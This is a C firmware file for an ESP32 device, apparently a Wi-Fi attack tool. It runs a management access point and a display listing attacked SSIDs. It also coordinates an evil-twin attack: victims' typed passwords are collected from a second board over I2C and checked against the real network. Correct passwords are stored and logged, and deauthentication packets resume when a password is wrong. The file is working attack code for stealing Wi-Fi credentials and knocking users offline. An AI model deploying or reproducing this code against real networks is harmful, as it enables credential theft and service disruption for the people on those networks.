/**
 * @file main.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Main file used to setup ESP32 into initial state
 * 
 * Starts management AP and webserver  
 */
#include "esp_heap_caps.h"
#include "esp_psram.h"

#include <stdio.h>
#include "nvs_flash.h"


#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "webserver.h"

#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "st7789.h"
#include "driver/gptimer.h"
#include "utime.h"
#include "esp_timer.h"

#include "global.h"

#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"



static const char* TAG = "main";

#define LV_TICK_PERIOD_MS 1

SemaphoreHandle_t xGuiSemaphore;

TaskHandle_t gui_task_Handle;
TaskHandle_t server_task_Handle;
TaskHandle_t i2c_monitor_task_Handle;

#define STACK_SIZE 4000

char * globalData[MAX_STRINGS] = {0};  
int globalDataCount = 0;
int framesPerSecond = 0;
//portMUX_TYPE dataMutex = portMUX_INITIALIZER_UNLOCKED;

#define SSID_MAX_LENGTH 36

void gui_task(void *arg) {
    lv_init();

    lv_display_t *display = lv_display_create(MY_DISP_HOR_RES, MY_DISP_VER_RES);
    lv_display_set_resolution(display, MY_DISP_HOR_RES, MY_DISP_VER_RES);

    static lv_color_t buf1[DISP_BUF_SIZE / 10];
    static lv_color_t buf2[DISP_BUF_SIZE / 10];
    lv_display_set_buffers(display, buf1, buf2, sizeof(buf1), LV_DISPLAY_RENDER_MODE_PARTIAL);
    lv_display_set_flush_cb(display, st7789_flush);
    
    static lv_style_t st;
    lv_style_init(&st);
    lv_style_set_text_font(&st, &lv_font_montserrat_14);

    lv_obj_t * screen = lv_scr_act();
    lv_obj_set_style_bg_color(screen, lv_color_black(), 0);
    lv_style_set_bg_color(&st, lv_color_black());
    lv_style_set_text_color(&st, lv_color_white()); 


    lv_obj_t *labels[15];

    for (size_t i = 0; i < 15; i++) {
        labels[i] = lv_label_create(lv_scr_act()); 
        lv_label_set_text(labels[i], ""); 
        lv_obj_set_pos(labels[i],35, 15 * i);
        lv_obj_add_style(labels[i], &st, 0);
    }

    while (1) {
        vTaskDelay(500 / portTICK_PERIOD_MS);
        if (pdTRUE == xSemaphoreTake(xGuiSemaphore, 50 / portTICK_PERIOD_MS)) {
            if (globalDataCount == 0) {
                lv_label_set_text(labels[0], "AP: Livebox");
                lv_label_set_text(labels[1], "Pass: mgmtadmin");
                lv_label_set_text(labels[2], "IP: 192.168.4.1");
            } else {
                char buffer[32];
                //ESP_LOGD(TAG, "Frames per second: %d", framesPerSecond);
                lv_label_set_text(labels[0], buffer);
                lv_label_set_text(labels[1], "SSIDs attacked:");
                for (int j=0; j<globalDataCount; j++) {
                    lv_label_set_text(labels[j+2], globalData[j]);
                }
            }

            lv_task_handler();  
            lv_refr_now(NULL);
            xSemaphoreGive(xGuiSemaphore);
        }
    }
}


void webserver_task(void *arg) {
    webserver_run();
    vTaskDelete(NULL); 
}


char* askSlave4Password() {
    static char pass[101];     
    uint8_t data[100];          
    int receivedCount = 0;

    memset(pass, 0, sizeof(pass)); 

    esp_err_t ret = i2c_master_read_from_device(
        I2C_MASTER_NUM,
        I2C_SLAVE_ADDR,
        data,
        sizeof(data),
        pdMS_TO_TICKS(1000)
    );

    if (ret == ESP_OK) {
        for (int i = 0; i < sizeof(data); i++) {
            char c = (char)data[i];
            if (c == '\n') {
                break;
            }
            if (receivedCount < sizeof(pass) - 1) {
                pass[receivedCount++] = c;
            } else {
                break; 
            }
        }
        pass[receivedCount] = '\0'; 
        return pass;
    } else {
        ESP_LOGE(TAG, "I2C Read Failed: %s", esp_err_to_name(ret));
        return NULL;
    }
}


// void requestStartDeauth() {
//     deauthStopRequested = 0;
//     //resume ability to send deauth packets:

//     ESP_ERROR_CHECK(esp_wifi_stop());
//     ESP_ERROR_CHECK(esp_wifi_deinit());

//     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
//     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
//     esp_netif_create_default_wifi_ap();

//     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

//     wifi_config_t wifi_config = { 0 };
//     strncpy((char *)wifi_config.ap.ssid, CONFIG_MGMT_AP_SSID, sizeof(wifi_config.ap.ssid));
//     strncpy((char *)wifi_config.ap.password, CONFIG_MGMT_AP_PASSWORD, sizeof(wifi_config.ap.password));

//     ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &wifi_config));
//     ESP_ERROR_CHECK(esp_wifi_start());


//     ESP_LOGI(TAG, "Resuming deauth packets sending");
//     vTaskDelay(pdMS_TO_TICKS(500));

// }


// int verifyPasswordInAPSTAMode(const char *ssid, const char *password) {
//     esp_wifi_disconnect();
//     wifi_config_t sta_config = { 0 };
//     strncpy((char *)sta_config.sta.ssid, ssid, sizeof(sta_config.sta.ssid));
//     strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));

//     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_config));
//     esp_err_t err = esp_wifi_connect();

//     ESP_LOGI(TAG, "Connecting to SSID: %s with password: %s", ssid, password);
//     //vTaskDelay(pdMS_TO_TICKS(2000));


//     if (err != ESP_OK) {
//         ESP_LOGW(TAG, "WiFi connect failed: %s", esp_err_to_name(err));
//         //return 0; // Connection failed
//     }

 
//     wifi_ap_record_t ap_info;
//     esp_err_t result = esp_wifi_sta_get_ap_info(&ap_info);

//     if (result == ESP_OK) {
//         ESP_LOGI(TAG, "Connected to AP. BSSID: %02x:%02x:%02x:%02x:%02x:%02x, RSSI: %d",
//          ap_info.bssid[0], ap_info.bssid[1], ap_info.bssid[2],
//          ap_info.bssid[3], ap_info.bssid[4], ap_info.bssid[5],
//          ap_info.rssi);

//         return 1;
//     } else {
//         ESP_LOGW(TAG, "Not connected to AP — wrong password or AP not found.");
//         return 0;
//     }
// }

int verifyPasswordInAPSTAMode(const char *ssid, const char *password) {
    passwordStatus = -1;

    esp_wifi_disconnect();
    wifi_config_t sta_config = { 0 };
    strncpy((char *)sta_config.sta.ssid, ssid, sizeof(sta_config.sta.ssid));
    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_config));
    ESP_ERROR_CHECK(esp_wifi_connect());

    int attempts = 0;
    while (passwordStatus == -1 && attempts < 40) { // max ~4 sekundy
        vTaskDelay(pdMS_TO_TICKS(100));
        attempts++;
    }
    ESP_LOGI(TAG, "Returning %d from verifyPasswordInAPSTAMode", passwordStatus);
    return passwordStatus;
}

void backToAPMode() {
    esp_wifi_disconnect();
    wifi_config_t ap_config = {
        .ap = {
            .ssid = CONFIG_MGMT_AP_SSID,
            .ssid_len = strlen(CONFIG_MGMT_AP_SSID),
            .password = CONFIG_MGMT_AP_PASSWORD,
            .max_connection = 0,
            .authmode = WIFI_AUTH_WPA2_PSK
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

    ESP_LOGI(TAG, "Switched back to AP mode");
}

/*int verifyPassword(const char *ssid, const char *password) {

    ESP_ERROR_CHECK(esp_wifi_stop());
    ESP_ERROR_CHECK(esp_wifi_deinit());

    // reinit
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));

    //change mode to station and connect to original wifi with provided password
    wifi_config_t wifi_config = { 0 };
    strncpy((char *)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
    strncpy((char *)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));

    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
    esp_netif_create_default_wifi_sta();
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Connecting to SSID: %s with password: %s", ssid, password);
    vTaskDelay(pdMS_TO_TICKS(2000));

    wifi_ap_record_t ap_info;
    esp_err_t result = esp_wifi_sta_get_ap_info(&ap_info);

    if (result == ESP_OK) {
        ESP_LOGI(TAG, "Connected to AP. BSSID: %02x:%02x:%02x:%02x:%02x:%02x, RSSI: %d",
         ap_info.bssid[0], ap_info.bssid[1], ap_info.bssid[2],
         ap_info.bssid[3], ap_info.bssid[4], ap_info.bssid[5],
         ap_info.rssi);

        return 1;
    } else {
        ESP_LOGW(TAG, "Not connected to AP — wrong password or AP not found.");
        return 0;
    }

}*/

void storePassword(const char *password) {
    size_t len = strlen(password);
    evilTwinVerifiedPassword = malloc(len + 1); // +1 na null-terminator

    if (evilTwinVerifiedPassword != NULL) {
        strncpy(evilTwinVerifiedPassword, password, len);
        evilTwinVerifiedPassword[len] = '\0';
    }

}


void passI2CToSlavePassOK()
{
    const char *data = "#()^7843%_GoodPass";
    esp_err_t ret = i2c_master_write_to_device(
        I2C_MASTER_NUM,
        I2C_SLAVE_ADDR,
        (const uint8_t *)data,
        strlen(data),
        pdMS_TO_TICKS(200)
    );

    if (ret == ESP_OK) {
        ESP_LOGI("I2C", "Passed GOOD PASS to ESP32");
    } else {
        ESP_LOGE("I2C", "Failed to send data: %s", esp_err_to_name(ret));
    }

    vTaskDelay(pdMS_TO_TICKS(200)); // delay 200ms
}


void passI2CToSlavePassNotOK()
{
    const char *data = "#()^7842%_BadPass";
    esp_err_t ret = i2c_master_write_to_device(
        I2C_MASTER_NUM,
        I2C_SLAVE_ADDR,
        (const uint8_t *)data,
        strlen(data),
        pdMS_TO_TICKS(200)
    );

    if (ret == ESP_OK) {
        ESP_LOGI("I2C", "Passed BAD PASS to ESP32");
    } else {
        ESP_LOGE("I2C", "Failed to send data: %s", esp_err_to_name(ret));
    }

    vTaskDelay(pdMS_TO_TICKS(200)); // delay 200ms
}

/* Every second check if Evil Twin is running. If yes, ask Slave over I2C if password has been provided. If yes, kill Evil Twin. */
void i2c_monitor_task(void *arg) {
    ESP_LOGI(TAG, "Starting I2C monitor task");
    while (1) {
        ESP_LOGI(TAG, "I2C monitor running");
        //check if Evil Twin is running
        if (applicationState == DEAUTH_EVIL_TWIN) {
            ESP_LOGI(TAG, "Twin is running, asking Slave if there is password entered by user");
            //send i2c question re password
            char * passwordProvidedByUser = askSlave4Password();
            ESP_LOGI(TAG, "Twin is running, got password to try: %s", passwordProvidedByUser);
            //if password returned:
            if (passwordProvidedByUser != NULL && strlen(passwordProvidedByUser) > 7 && strlen(passwordProvidedByUser) < 64) {

                // bool hasNullTerminator = false;
                // for (int i = 0; i < sizeof(passwordProvidedByUser); i++) {
                //     if (passwordProvidedByUser[i] == '\0') {
                //         hasNullTerminator = true;
                //         break;
                //     }
                // }

                // if (!hasNullTerminator) {
                //     ESP_LOGE(TAG, "Password does not have null terminator, something went wrong in i2c communication");
                //     continue; // skip this iteration
                // }

                ESP_LOGI(TAG, "Stopping deauth to verify password: %s", passwordProvidedByUser);
                //stop deauth for a sec:
                applicationState = EVIL_TWIN_PASS_CHECK;
                //verify password (try to connect)
                int passOK = verifyPasswordInAPSTAMode(evilTwinSSID, passwordProvidedByUser);
                //if incorrect:
                if (passOK == 1) {
                    ESP_LOGW(TAG, "This password was correct: %s", passwordProvidedByUser);
                    // if correct:
                    // display it in logs, on the screen and store locally for further CLI request
                    storePassword(passwordProvidedByUser);
                    //then stop deauth and pass i2c info to Slave that attack was successful and evil twin shall be stopped
                    passI2CToSlavePassOK();
                    applicationState = IDLE;   
                } else {           
                    ESP_LOGI(TAG, "This password wasn't correct: %s", passwordProvidedByUser);
                    passI2CToSlavePassNotOK();
                    // resume deauth
                    backToAPMode();
                    applicationState = DEAUTH_EVIL_TWIN;
                    passwordProvidedByUser = NULL;
                    ESP_LOGI(TAG, "Resuming deauth packets sending");
                }
            } else {
                //just do nothing, Evil Twin is still running
                ESP_LOGI(TAG, "No password provided by user, Evil Twin is still running");
            }
        } else {
            ESP_LOGI(TAG, "Twin is not running at the moment, app state: %d", applicationState);
        }

        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}

static void wifi_event_handler(void *event_handler_arg, esp_event_base_t event_base,
                               int32_t event_id, void *event_data) {
   if (event_base == WIFI_EVENT) {
        switch (event_id) {
            case WIFI_EVENT_STA_DISCONNECTED: {
                wifi_event_sta_disconnected_t *disc = (wifi_event_sta_disconnected_t *) event_data;

                ESP_LOGW(TAG, "STA disconnected. Reason: %d", disc->reason);
                
                if (disc->reason == WIFI_REASON_AUTH_EXPIRE || disc->reason == WIFI_REASON_AUTH_FAIL) {
                    passwordStatus = 0; // wrong password
                } else {
                    passwordStatus = -1; // unknown reason
                }
                break;
            }

            case WIFI_EVENT_STA_CONNECTED:
                ESP_LOGI(TAG, "STA connected to AP.");
                passwordStatus = 1; // successful connection
                break;

            default:
                break;
        }
    }
}


void app_main(void) {
    ESP_LOGI(TAG, "app_main started yet");

    // esp_err_t ret1 = esp_psram_init();
    // if (ret1 == ESP_OK) {
    //     size_t psram_size = esp_psram_get_size();
    //     ESP_LOGW(TAG, "PSRAM size: %d bytes\n", psram_size);
    // } else {
    //     ESP_LOGW(TAG, "PSRAM not detected\n");
    // }

    // void* ptr = heap_caps_malloc(1024, MALLOC_CAP_SPIRAM);
    // if (ptr != NULL) {
    //     ESP_LOGW(TAG, "Malloc from PSRAM succeeded\n");
    //     heap_caps_free(ptr);
    // } else {
    //     ESP_LOGW(TAG, "Malloc from PSRAM failed\n");
    // }


    //ESP_LOGW("MEM", "Free heap: %d bytes", esp_get_free_heap_size());
    //ESP_LOGW("MEM", "Free 8-bit heap: %d bytes", heap_caps_get_free_size(MALLOC_CAP_8BIT));

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_ERROR_CHECK(nvs_flash_init());
    wifictl_mgmt_ap_start();
    attack_init();

    BaseType_t webresult =xTaskCreate(webserver_task, "webserver", STACK_SIZE, NULL, 5, &server_task_Handle);
    if (webresult != pdPASS) {
        ESP_LOGE(TAG, "xTaskCreate 4 webserver failed: %d", webresult);
    } else {
        ESP_LOGI(TAG, "Webserver task created successfully");
    }

    vTaskDelay(1000 / portTICK_PERIOD_MS);

    BaseType_t result = xTaskCreate(i2c_monitor_task, "i2cmon", STACK_SIZE, NULL, 6, &i2c_monitor_task_Handle);
    if ( result != pdPASS ) {
        ESP_LOGE(TAG, "xTaskCreate 4 monitoring failed: %d", result);
    } else {
        ESP_LOGI(TAG, "I2C monitor task created successfully");
    }



    vTaskDelay(1000 / portTICK_PERIOD_MS);
    xGuiSemaphore = xSemaphoreCreateMutex();
    spi_display_init();
    st7789_init();
    BaseType_t guiresult = xTaskCreate(gui_task,       "gui",       STACK_SIZE, NULL, 1, &gui_task_Handle);
    if (guiresult != pdPASS) {
        ESP_LOGE(TAG, "xTaskCreate 4 gui failed: %d", guiresult);
    } else {
        ESP_LOGI(TAG, "GUI task created successfully");
    }
    vTaskDelay(1000 / portTICK_PERIOD_MS);

    //ESP_LOGW(TAG, "esp_get_free_heap_size(): %u bytes\n", esp_get_free_heap_size());
    //size_t free_size = heap_caps_get_free_size(MALLOC_CAP_DEFAULT);
    //size_t largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_DEFAULT);
    //ESP_LOGW(TAG, "heap_caps_get_largest_free_block(MALLOC_CAP_DEFAULT): %d bytes\n", largest_block);
    //ESP_LOGW(TAG, "heap_caps_get_free_size(MALLOC_CAP_DEFAULT): %d bytes\n", free_size);
    //ESP_LOGW(TAG, "heap_caps_get_free_size(MALLOC_CAP_8BIT): %u bytes", heap_caps_get_free_size(MALLOC_CAP_8BIT));
    //ESP_LOGI(TAG, "Free heap: %d bytes\n", esp_get_free_heap_size());
    //ESP_LOGI(TAG, "Largest free heap: %d bytes\n", heap_caps_get_largest_free_block(MALLOC_CAP_DEFAULT));

    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL));


}

